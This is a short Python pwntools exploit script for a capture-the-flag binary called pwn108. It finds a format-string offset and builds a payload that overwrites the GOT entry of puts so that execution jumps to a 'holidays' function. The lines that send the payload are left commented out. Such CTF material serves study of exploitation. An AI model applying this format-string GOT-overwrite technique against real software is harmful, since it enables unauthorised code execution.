#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn108-1644300489260.pwn108_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

def exec_fmt(payload):
    r = conn()
    r.recvuntil("]:")
    r.sendline("any")
    r.recvuntil("]:")

    r.sendline(payload)
    r.recvuntil("Register no  : ")
    return r.recvline().strip()

def main():
    # print(exec_fmt())
    autofmt = FmtStr(exec_fmt)
    log.info(autofmt.offset)
    r = conn()
    # r.recvuntil("]:")
    # r.sendline("any")
    # r.recvuntil("]:")

    frmtstring = fmtstr_payload(10, {exe.got['puts']: exe.symbols['holidays']})
    # exec_fmt(frmtstring)
    # # payload = flat(
    # #     frmtstring
    # # )
    # r.sendline(frmtstring)


    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
